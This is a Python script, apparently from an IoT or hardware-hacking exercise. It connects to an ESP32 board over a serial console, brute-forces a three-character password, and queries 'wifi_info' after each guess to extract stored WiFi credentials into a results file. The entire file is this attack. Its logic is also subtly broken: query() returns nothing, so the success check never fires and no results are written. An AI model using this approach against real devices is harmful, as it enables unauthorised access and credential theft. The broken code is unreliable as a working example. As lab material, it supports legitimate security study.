import serial
import string
baudrates = [9600, 19200, 115200]
parities = [serial.PARITY_NONE, serial.PARITY_EVEN, serial.PARITY_ODD]

def read_block(ser_conn, num_lines): # How we read the console
    for line in range(num_lines):
        print(ser_conn.readline())

def query(ser_conn, message): # Get message
    ser_conn.write(message.encode())
    read_block(ser_conn, 10)

# Comment out this block and uncomment bottom section after being modified
# for baudrate_for_loop in baudrates:
#     for parity_for_loop in parities:
#         print(baudrate_for_loop, parity_for_loop)
#         serial_conn = serial.Serial('COM5', baudrate=baudrate_for_loop, parity=parity_for_loop, timeout=0.1)
#         # Hit the enable (EN) on the ESP32 before this read_block finishes
#         print('Press Button')
#         read_block(serial_conn, 50)
#         print('THIS IS THE END =====================')
#         serial_conn.close()

# # serial_conn = serial.Serial('COM5', baudrate=19200, parity=serial.PARITY_ODD, timeout=0.1)
# # read_block(serial_conn, 100)
# exit()  
    
# To connect to the board and input the password:

# Initialize serial connection
serial_conn = serial.Serial('COM5', baudrate=19200, parity=serial.PARITY_ODD, timeout=0.1)
read_block(serial_conn, 100) # Change to a lower number to be faster

# # Manually plug in:
# query(serial_conn, 'I0t\r')                      # Enters result to try
# query(serial_conn, "wifi_info\r")

# Should take less than 5 lines of code
# Initialize variables to brute force with
upper_letters = string.ascii_uppercase # "ABCDEFGHIJKLMNOPQRSTUVWXYZ" does not work
digits = string.digits
lower_letters = string.ascii_lowercase

# # Opens a file to write the results in
with open('results.txt', 'w') as file:
    
    # Loops through every single combination
    for upper in upper_letters:                                          # Loops through upper case letters
        for digit in digits:                                             # loops through digits
            for lower in lower_letters:                                  # Loops through lower case letters
                passwd = upper + digit + lower + '\r'                 # Brings together the combination and enter command
                print(passwd)                                            # prints out result
                result = query(serial_conn, passwd)                      # Enters result to try

                if result != None:                                         # Only runs if there is not a no ouput
                    # Retrieve Secret Info if password is correct
                    wifi = query(serial_conn, "wifi_info\r")

                    output_line = f'{passwd.strip()} - {result} - {wifi}'    # Creates the output line to write in file
                    file.write(output_line + '\n')                           # Writes the output line in file